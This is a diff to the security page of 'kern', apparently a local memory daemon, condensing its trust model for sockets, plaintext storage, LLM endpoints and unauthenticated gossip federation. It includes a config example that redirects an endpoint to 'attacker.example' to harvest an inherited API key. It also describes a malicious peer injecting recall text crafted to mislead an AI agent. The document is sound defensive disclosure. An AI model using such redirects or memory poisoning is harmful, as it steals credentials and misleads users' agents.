@@ -2,374 +2,92 @@
 title: "Security"
 ---
 
-This page is the trust model of kern as implemented today: what the daemon
-exposes on the local machine, what data leaves it, and exactly what a peer on
-the network can and cannot do once [federation](./federation.mdx) is enabled.
-It describes the code that actually runs, including the parts that protect
-nothing.
+The trust model as implemented today: what the daemon exposes locally, what leaves the machine, and what a network peer can and cannot do once [federation](./federation.mdx) is enabled — including the parts that protect nothing.
 
 <Callout type="info" title="TL;DR">
-- **A default kern opens no network port.** The daemon serves RPC over an
-  owner-only Unix domain socket and MCP over stdio. Gossip is off
-  (`src/config/gossip.rs:62`), and even turning it on dials nothing until you
-  configure peers or opt into the public seed.
-- **Memory is plaintext on disk.** The graph lives in an unencrypted LMDB file
-  under `.kern/data`. Treat it with the same care as the source tree it
-  describes.
-- **Everything kern captures transits your LLM endpoints.** By default those
-  are `http://localhost:11434` (Ollama). Point them at a hosted API and your
-  memory leaves the machine — that is a configuration decision, not a kern
-  default.
-- **Federation, when enabled, is unauthenticated and unencrypted.** Treat the
-  gossip network as a trusted LAN segment — the same trust you would give an
-  NFS export or an internal Redis with no auth. The blast radius of a
-  malicious peer is bounded but non-zero; the exact bounds are below.
+- **A default kern opens no network port** — RPC over an owner-only Unix socket, MCP over stdio, gossip off.
+- **Memory is plaintext on disk** in `.kern/data` — treat it like the source tree it describes.
+- **Everything kern captures transits your LLM endpoints** — localhost Ollama by default. Pointing them at a hosted API is your configuration decision, not a kern default.
+- **Federation, when enabled, is unauthenticated and unencrypted** — treat the gossip segment like an unauthenticated internal Redis.
 </Callout>
 
 ## Nothing listens by default
 
-kern runs one daemon per working directory, and a single-node daemon has no
-TCP or UDP listener at all. Its two surfaces are local:
+- **RPC socket** — Unix domain socket, mode `0600`. That permission is the entire access-control story: the socket serves unauthenticated reads and mutations, so only the owning user may reach it.
+- **MCP** — stdio by default; no listener. MCP-over-HTTP is opt-in and never unauthenticated: bearer token from config or a per-graph token file minted `0600` on first use; remote callers without it get a 401.
 
-**The RPC socket.** The daemon binds a Unix domain socket at
-`$XDG_RUNTIME_DIR/kern-<cwd-hash>.sock` (falling back to
-`/tmp/kern-<hash>-<user>.sock`) and immediately sets it to mode `0600`
-(`src/trnsprt/src/typed/local.rs:44` and `:240`; bound at
-`src/commands.rs:736`). The permission is the entire access-control story:
-the socket serves unauthenticated graph reads *and* mutations, so it must be
-reachable only by the owning user. There is a sub-millisecond window between
-bind and chmod at the umask default; the alternative — flipping the
-process-global umask — would race every unrelated file a multi-threaded
-daemon creates, so the window is the accepted cost. The machine-level hub
-uses the same scheme (`kern-hub.sock`, `src/trnsprt/src/typed/local.rs:28`).
-
-**MCP.** The default MCP transport is stdio (`src/commands.rs:765`) — the
-client process spawns or attaches to the daemon and no listener exists.
-MCP-over-HTTP is opt-in via `--mcp-addr`, and it is never served
-unauthenticated: the server resolves a bearer token from config or from a
-per-graph token file minted with mode `0600` on first use
-(`src/mcp/sse.rs:10`, `src/config/serve.rs:50` and `:29`). The token is
-minted rather than demanded from the operator because an unauthenticated
-default is the one failure mode that cannot be patched after the fact — a
-local user gets a working setup with zero configuration, and a remote caller
-without the token gets a 401.
-
-The consequence of this posture: on a single-user machine, kern's local
-attack surface reduces to filesystem access. Anyone who can read your files
-can read your memory; anyone who cannot, cannot reach the daemon either.
+Local attack surface reduces to filesystem access: anyone who can read your files can read your memory; anyone who cannot, cannot reach the daemon either.
 
 ## Data at rest is plaintext
 
-The graph persists to an LMDB environment at `.kern/data/data.mdb` inside
-the working directory (`Config::default_in`, `src/config/mod.rs`; `Store::open`, `src/base/store.rs:351`).
-There is no at-rest encryption and none is planned at this layer: kern is a
-local-first tool, and the memory it holds is exactly as sensitive as the
-code and conversations it was distilled from — which sit unencrypted in the
-same directory tree. Encrypting the store while the source of every fact
-stays plaintext beside it would be theater. If the disk needs protection,
-full-disk encryption protects both.
+`.kern/data/data.mdb` is unencrypted. No at-rest encryption planned at this layer: the memory is exactly as sensitive as the code and conversations it was distilled from, which sit unencrypted in the same tree — encrypting one beside the other is theater. If the disk needs protection, full-disk encryption protects both.
 
-Three files deserve explicit mention: the MCP token file
-(`.kern/data/mcp-token`, created `0600` before any content is written), the
-LMDB file itself, and `.kern/data/logs/*.log`. The logs hold the captured
-stdout and stderr of detached children — the daemon `kern mcp` spawns, and the
-hub's per-root node. They are opened owner-only and appended rather than
-truncated (`src/config/detached_log.rs:23`, via `open_private_append`,
-`src/config/serve.rs:50`), because a restart must not erase the log explaining
-why it restarted. They contain whatever kern logs, which at `RUST_LOG=debug`
-can include graph content. Back up or sync `.kern/` with the same policy you
-apply to private repositories.
+Also under `.kern/data`: the MCP token file (`0600`), and `logs/*.log` — owner-only, append-only, and at `RUST_LOG=debug` they can include graph content. Back up or sync `.kern/` with the same policy as a private repo.
 
 ## What leaves the machine
 
-kern makes outbound connections in exactly two situations.
+**LLM endpoints — always, by design.** Every captured text is embedded; distillation and enrichment send memory content as prompt context.
 
-**LLM endpoints — always, by design.** Every captured text is embedded, and
-distillation and answer synthesis send memory content as prompt context. The
-endpoints are:
+| Leg | Default URL | Default model |
+|---|---|---|
+| Embedding | `http://localhost:11434` | `qwen3-embedding:0.6b` |
+| Reason | `http://localhost:11434` | `granite4:3b` |
 
-| Leg | Default URL | Default model | Config |
-|---|---|---|---|
-| Embedding | `http://localhost:11434` | `qwen3-embedding:0.6b` | `src/config/embed.rs:3` |
-| Reason (distillation) | `http://localhost:11434` | `granite4:3b` | `src/config/reason.rs:11` |
-| Answer (`/ask`) | falls back to the reason endpoint | shared | `src/config/answer.rs:17`, `src/llm.rs:99` |
+Defaults keep everything on localhost. Redirecting to a hosted API is the single largest data-flow decision an operator makes; kern deliberately does not make it for you.
 
-The defaults keep everything on localhost. If you set these URLs to a hosted
-API, the full text of everything kern captures transits that provider —
-kern attaches `Authorization: Bearer <key>` when a key is configured
-(`src/llm.rs:442`) and does nothing else to the payload. This is the single
-largest data-flow decision an operator makes, and kern deliberately does not
-make it for you.
-
-**The gossip seed — never, unless opted in twice.** The public bootstrap
-seed (`seed.kern.dev:7946`, `src/base/constants.rs:83`) is dialed only when
-*both* `gossip.enabled` and `gossip.seed` are true
-(`src/config/gossip.rs:19`); the seed flag defaults to false precisely
-because federation is unauthenticated — a default-on seed would auto-join a
-stranger's network (`src/config/gossip.rs:70`). A default daemon makes zero
-outbound calls beyond your configured LLM endpoints.
+**The gossip seed — never, unless opted in twice.** Dialed only when both `gossip.enabled` and `gossip.seed` are true.
 
 ### Keys do not follow a redirected endpoint
 
-Config scopes deep-merge per key (`merge_deep`, `src/config/io.rs:51`): a
-project `.kern/kern.toml` overrides individual fields and inherits the rest from
-the user-level file. That is what lets a user-level `[embed] key` keep working
-when a project sets only `model` — and it is also the hole. A repo you cloned
-could commit `[embed] url = "http://attacker.example/v1"`, inherit your
-`sk-live-…`, and harvest it on the first embed call; because `reason_key` and
-`answer_key` fall back to `embed.key`, redirecting any one endpoint reaches it.
-
-So the merge has one deliberate exception: **a scope that sets a section's `url`
-does not inherit that section's `key`** (`seal_redirected`,
-`src/config/secrets.rs:15`). The redirect still applies — only the credential is
-withheld. A scope that redirects an endpoint must supply its own key or go
-without, and a scope that leaves the endpoint alone keeps inheriting normally.
-The sealing is per section: redirecting `[embed]` does not strip `[reason]`'s
-key.
-
-This is a mitigation, not a sandbox. A project config can still point kern at
-any endpoint it likes and send your memory there; what it cannot do is take a
-credential minted for a different one.
+Config scopes deep-merge per key, so a project `.kern/kern.toml` inherits user-level settings — a cloned repo committing `[embed] url = "http://attacker.example"` could harvest your inherited API key on the first embed call. One deliberate exception: **a scope that sets a section's `url` does not inherit that section's `key`.** The redirect applies; the credential is withheld. A mitigation, not a sandbox — a project config can still send your memory to any endpoint it names, but not with a credential minted for a different one.
 
 ## The federation trust model
 
-Everything below applies only after you set `[gossip] enabled = true`. With
-gossip on, a node (`src/commands.rs:937`):
+Applies only after `[gossip] enabled = true`. Raw TCP plus plaintext UDP discovery — no encryption, no authentication, no signatures. Sniffing the segment reads every shared thought; reaching the port speaks the protocol.
 
-1. Binds a TCP listener, default `0.0.0.0:7400` (`src/config/gossip.rs:63`).
-2. If discovery is on, broadcasts a plaintext
-   `kern:<network_id>:<tcp_addr>` announce to multicast group
-   `239.77.75.68` on UDP port `7475` every ten seconds, and listens for the
-   same (`src/gossip/discovery.rs:24`, `src/base/constants.rs:81`,
-   `src/config/gossip.rs:66`).
-3. Every 30 seconds, broadcasts its root scope (including its summary text)
-   and its 32 hottest entity bodies to its peers
-   (`src/gossip/handler.rs:107` and `:166`).
+**Why no authentication yet:** signatures without an identity scheme (key generation, distribution, revocation across multicast-discovered daemons) are worthless, and a half-measure would imply safety the protocol does not provide. Interim rule: **run gossip only on a segment where you trust every host**; get confidentiality from the network layer (WireGuard, VPN). `network_id` is a grouping key broadcast in cleartext, not a credential.
 
-The transport is raw TCP carrying length-prefixed bincode
-(`src/gossip/transport.rs:9`). There is no encryption, no peer
-authentication, and no payload signature. Anyone who can sniff the segment
-reads every shared thought; anyone who can reach port 7400 can speak the
-protocol.
+Structural bounds, one principle: your local graph records what *you* learned; no remote assertion may alter it or buy ranking influence inside it.
 
-### Why there is no authentication yet
-
-Signatures without an identity scheme are worthless — they require key
-generation, distribution, and revocation across daemons that discover each
-other by multicast, which is a real design effort, not a checkbox. Shipping
-a half-measure (a shared secret, a checked-but-unsigned field) would imply
-a safety the protocol does not provide, and operators calibrate risk to
-what they believe is protected. So kern does the honest version: it states
-plainly that the transport protects nothing, bounds the blast radius
-structurally instead (quarantine, caps, signal stripping — below), and
-names the accepted interim bound: **run gossip only on a segment where you
-trust every host**, and get confidentiality from the network layer
-(WireGuard, a VPN mesh) if you need it. The same reasoning applies to
-`network_id`: it is broadcast in cleartext in every announce, so treating
-it as a credential would be theater. It is a *grouping* key that keeps
-co-located honest deployments from merging (`src/gossip/discovery.rs:61`)
-— nothing more.
-
-### What the design bounds, and why
-
-The structural bounds all follow from one principle: **your local graph is
-the record of what you learned, and no remote assertion may alter it or
-buy ranking influence inside it.**
-
-- **Remote data is quarantined.** Inbound entities land in a phantom kern
-  named `remote-<sender network_id>-<sender kern_id>`
-  (`src/gossip/handler.rs:476`), never in your own kerns. The `remote-`
-  prefix is the one durable provenance signal an entity carries
-  (`src/base/merge.rs:11`). Quarantine is what makes remote data
-  *disposable*: it can be capped, distrusted, and dropped without touching
-  any local invariant.
-- **Id hijack is rejected.** Ids are content hashes, so merge is
-  set-union: a peer can contribute an id but never mutate one you hold. An
-  inbound entity whose id already belongs to a *different* kern is refused
-  outright as a hijack attempt (`src/base/merge.rs:167`) — without this, a
-  forged id colliding with a local entity would let a peer supersede or
-  reheat your own record.
-- **Ranking signals are stripped at the boundary.** Because federation is
-  unauthenticated, every signal a peer could use to buy influence in
-  recall is dropped on entry to a `remote-*` kern: heat and access counts
-  reset to zero, confidence resets to the neutral prior
-  (`src/base/merge.rs:20`, applied on every merge at
-  `src/base/merge.rs:139`). Heat is earned by *local* use only — a remote
-  assertion of `heat = 10⁹` arrives as `heat = 0`, and since subsequent
-  joins also see the stripped value, the max-join can never raise it
-  either.
-- **Confidence never crosses the wire in either direction of influence.**
-  `conf_alpha`/`conf_beta` are excluded from the CRDT join entirely
-  (`src/base/merge.rs:93`): a max-join on confidence would be an
-  irreversible poisoning pin — one peer asserting certainty would raise it
-  everywhere with no way back down. Trust is evidence a replica
-  accumulates locally, not an assertion it receives.
-- **Statement text never merges.** `id == content_hash(text)`, so a
-  same-id peer has identical content by construction and a differing one
-  is lying about what its id hashes to. Statements are therefore never
-  imported on merge (`src/base/merge.rs:113`), and the wire-level
-  `Statements` delta target is parsed but deliberately never applied
-  (`src/gossip/handler.rs:448`) — kept as a rejected variant rather than
-  removed, so a peer running an older build cannot inject text under a
-  content-addressed id.
-- **Flood limits.** Each `remote-*` kern caps at 50,000 entities; at the
-  cap, new remote ids are dropped while known ids keep merging
-  (`src/base/merge.rs:182`, `src/base/constants.rs:90`). Frames over 4 MB
-  are rejected before the buffer is allocated
-  (`src/gossip/transport.rs:27`). Counter deltas above 1,000,000 per
-  message are refused (`src/gossip/handler.rs:349`). The duplicate-
-  suppression set is bounded by a 60-second TTL and a 10,000-entry hard
-  cap (`src/gossip/seen.rs:28`), so replay floods are dropped and the set
-  cannot grow without bound. The peer table caps at 50
-  (`src/gossip/node.rs:84`).
-- **One poisoned message does not take the daemon down.** Each inbound
-  connection is handled on its own task (`src/gossip/node.rs:115`) and the
-  shared locks are non-poisoning, so a panic while processing one message
-  kills that connection's task, not the process.
-
-### What is deliberately not defended
-
-Honesty requires listing the levers that remain, because "quarantined" is
-not "inert":
-
-- **Your federated graph is readable.** The fetch RPC serves any entity
-  body by id to any connecting peer, with no authentication
-  (`src/gossip/handler.rs:50`, wired at `src/commands.rs:973`) — and the
-  hottest 32 entities are broadcast every heartbeat anyway. Enabling
-  gossip means every host on the segment can read what kern knows.
-- **Your graph is probeable.** A peer can send `Question` messages
-  carrying embedding vectors; when a local entity matches above the 0.80
-  threshold, the node answers with its root scope and the matching entity
-  id (`src/gossip/handler.rs:273`, `src/base/constants.rs:74`).
-- **CRDT deltas reach local rows.** The delta handler matches object ids
-  across *all* kerns, including local ones (`src/gossip/handler.rs:359`).
-  A peer that has learned an id — trivial, since ids are broadcast — can
-  inflate its access and traversal counters (clamped per message, but
-  replica slot names are attacker-chosen), set reason scores, and
-  last-write-wins a local entity's `valid_until`
-  (`src/gossip/handler.rs:424`).
-
-  Reaching local rows is deliberate for the *counters*: ids are content
-  hashes, so the same fact is a local row on both machines, and G-Counter
-  slots are meant to merge across replicas. It is not deliberate for the
-  two last-write-wins fields, and `valid_until` is the sharpest edge —
-  **a malicious peer can mark a local claim expired.** Today that is
-  narrower than it sounds, because expiry is only honoured when a caller
-  passes `valid_at` (`matches_filter`, `src/retrieval/score.rs:171`); default recall ignores
-  the field, so a poisoned `valid_until` currently hides a claim only from
-  callers that ask for time-filtered results. Treat that as a reprieve, not
-  a defence: it disappears the moment expiry is enforced on the default
-  path.
-- **Pulses carry attacker-chosen strength, and default to your root kern.**
-  A `Pulse` message deposits heat into the entities of a named local kern
-  with no network check and no strength clamp
-  (`src/gossip/handler.rs:308`, `src/tick/pulse.rs:107`), so a peer can
-  heat parts of your local graph and influence what recall considers
-  active. Worse, an unrecognised `kern_id` does not reject — it falls back
-  to the local root kern (`src/gossip/handler.rs:319`), so a peer needs to
-  know no ids at all to aim this.
-- **Sender identity is self-declared.** The per-sender quarantine
-  namespace separates *honest* senders; a malicious host can stamp any
-  `network_id` on its payloads and write into that network's `remote-*`
-  namespace on your node.
-- **Injected text is retrievable.** Remote entities are vector-indexed on
-  insert, so an attacker's text can surface in recall results (flagged by
-  its `remote-*` provenance, with zeroed ranking signals — but present).
-  If your recall output feeds an agent, federation extends that agent's
-  context to every host on the segment.
-- **Content is accepted on cap, not verified.** Entity bodies are not
-  checked against their claimed ids on the sync path — the network
-  scoping and the entity cap are the accepted bound
-  (`src/gossip/handler.rs:463`).
+- Remote entities quarantined in `remote-*` phantom kerns, never your own.
+- Content-hash ids: merge is set union; an id owned by a different kern is rejected as a hijack.
+- Ranking signals stripped at the boundary — heat and access zeroed, confidence reset to neutral.
+- Confidence never merges in either direction — a max-join would be an irreversible poisoning pin.
+- Statement text never merges — a same-id peer has identical content by construction; a differing one is lying about its hash.
+- Flood limits: 50k entities per remote namespace, 4 MB frame cap, per-message counter clamps, bounded dedup set, 50-peer table.
+- A poisoned message kills its own connection task, not the daemon.
 
 ### What a malicious peer can and cannot do
 
 | A peer on the segment **can** | Bound |
 |---|---|
-| Read every broadcast and fetch any entity body by id | none — the read surface is open |
-| Inject entities with arbitrary text | quarantined `remote-*` namespace, 50k cap per sender id, indexed but ranking-stripped |
+| Read every broadcast; fetch any entity body by id | none — the read surface is open |
+| Inject entities with arbitrary text | quarantined, capped, ranking-stripped — but vector-indexed, so retrievable |
 | Probe whether you hold a fact near a given vector | 0.80 similarity threshold |
-| Inflate access/traversal counters on local rows | ≤ 1,000,000 per message; unbounded across replica names |
-| Set reason scores and `valid_until` on local rows it knows ids for | LWW — highest lamport wins; a poisoned `valid_until` bites only callers passing `valid_at` |
-| Deposit heat into local kerns via `Pulse` | strength unclamped; an unknown `kern_id` falls back to your **root** kern |
-| Impersonate any `network_id` | by design — it is not a credential |
-| Fill the peer table with junk addresses | capped at 50 |
+| Inflate access/traversal counters on local rows | clamped per message; replica names attacker-chosen |
+| Set reason scores and `valid_until` on local rows | LWW; a poisoned `valid_until` bites only callers passing `valid_at` — today |
+| Deposit heat into local kerns via `Pulse` | strength unclamped; an unknown kern id falls back to your **root** kern |
+| Impersonate any `network_id` | by design — not a credential |
 
-| A peer **cannot** | Enforced at |
+| A peer **cannot** | Why |
 |---|---|
-| Alter or delete the text of any entity you hold | `src/base/merge.rs:113`, `src/gossip/handler.rs:448` |
-| Claim an id owned by one of your local kerns | `src/base/merge.rs:167` |
-| Raise the confidence of anything, local or remote | `src/base/merge.rs:93` and `:20` |
-| Give its injected entities heat or access history | `src/base/merge.rs:20` |
-| Grow a remote namespace past 50k entities | `src/base/merge.rs:182` |
-| Send a frame over 4 MB or a counter delta over 10⁶ | `src/gossip/transport.rs:27`, `src/gossip/handler.rs:349` |
-| Crash the daemon with one malformed or poisoned message | task-per-connection, non-poisoning locks |
+| Alter or delete the text of any entity you hold | statement text never merges |
+| Claim an id owned by one of your local kerns | hijack guard |
+| Raise the confidence of anything | confidence never crosses the wire |
+| Give its injected entities heat or access history | stripped at the boundary |
+| Grow a remote namespace past 50k entities | cap |
+| Crash the daemon with one malformed message | task-per-connection, non-poisoning locks |
 
-## Walkthrough: an attacker injects an entity
-
-Suppose a host on your segment reads one discovery announce, learns your
-`network_id` and TCP address, and sends an `EntitySync` claiming network
-`evil` with an entity stamped `heat = 10⁹`, `conf_alpha = 10⁹`, and text
-crafted to mislead an agent reading recall output.
-
-<Mermaid
-  chart={`
-sequenceDiagram
-    participant M as malicious host
-    participant K as your daemon
-    M->>K: EntitySync (network_id "evil", poisoned entity)
-    Note over K: network_id ≠ local → phantom kern<br/>remote-evil-&lt;kern_id&gt; created
-    Note over K: strip on entry: heat → 0, access → 0,<br/>confidence → neutral prior
-    Note over K: id collides with a local kern? → rejected<br/>namespace at 50k cap? → dropped
-    Note over K: else: stored + vector-indexed<br/>text IS now retrievable, tagged remote-*
-`}
-/>
-
-What lands: the entity exists in `remote-evil-<kern_id>`, with zero heat,
-zero access history, and neutral confidence — every ranking lever the
-attacker pulled was stripped at the boundary. What does *not* happen: no
-local entity is touched, no id you hold is affected, and re-sending the
-entity a thousand times changes nothing (the join is idempotent and the
-stripped values re-join to the same result). What *remains*: the text is
-vector-indexed and can appear in recall, and the same attacker can
-separately pulse heat into your local kerns and expire local claims via
-deltas. The quarantine bounds the damage; it does not make the peer
-harmless. That residual is exactly why the deployment bound below is
-stated in terms of trusting every host.
+Residuals: enabling gossip lets every host on the segment read what kern knows and place retrievable text into your recall results (flagged `remote-*`, ranking-stripped, but present) — if recall feeds an agent, federation extends that agent's context to every host on the segment. A peer can also heat your local graph and expire local claims via LWW deltas; quarantine bounds the damage, it does not make a peer harmless.
 
 ## Deployment guidance
 
-**Acceptable placement** for an enabled gossip network:
+**Acceptable:** a home or lab LAN you control; a private VPC subnet with the gossip TCP and discovery UDP ports closed to the fleet; a WireGuard-style mesh (the only source of confidentiality and peer authentication today).
 
-- a home or lab LAN where you control every host
-- a private VPC subnet with security groups closing 7400/tcp and 7475/udp
-  to the fleet
-- a WireGuard or similar VPN mesh — this is also the only way to get
-  confidentiality and peer authentication today, because the protocol
-  provides neither
+**Unacceptable:** any public interface (bind `addr` to a private interface — the default is `0.0.0.0:7400`); coffee-shop or hotel Wi-Fi; a shared office VLAN; any segment carrying hosts you would not allow to read your working memory and inject text into your agent's recall.
 
-**Unacceptable placement:**
-
-- any public interface — the default `0.0.0.0:7400` binds all interfaces,
-  so on a multi-homed host set `addr` to a specific private interface
-- coffee-shop or hotel Wi-Fi, a shared office VLAN, anything reachable
-  from the internet
-- any segment carrying hosts you would not allow to read your working
-  memory and inject text into your agent's recall
-
-Use a distinct `network_id` per logical deployment so unrelated fleets on
-one segment do not pair, prefer an explicit `peers` list over multicast
-discovery, and leave `seed = false` unless you deliberately want to join
-the public bootstrap network. If you do not need multi-node memory, leave
-gossip off — that is the default, and it removes this entire page's
-network section from your threat model. See
-[Configure kern](../howto/configure.mdx) for the `[gossip]` block.
+Distinct `network_id` per deployment, explicit `peers` list over discovery, `seed = false`. No multi-node need → leave gossip off (the default) and this page's network section exits your threat model. See [Configure](../howto/configure.mdx).
 
 ## Reporting
 
-If you find a security issue — in the federation path or anywhere else —
-report it privately before public disclosure, via
-[GitHub security advisories on the repository](https://github.com/yesitsfebreeze/kern/security/advisories)
-rather than a public issue. Reports that include the observed behavior and
-the file/line you believe is at fault are fastest to act on; this page's
-citations are kept current for exactly that reason.
+Report security issues privately via [GitHub security advisories](https://github.com/yesitsfebreeze/kern/security/advisories) before public disclosure, with the observed behavior and where you believe the fault lies.
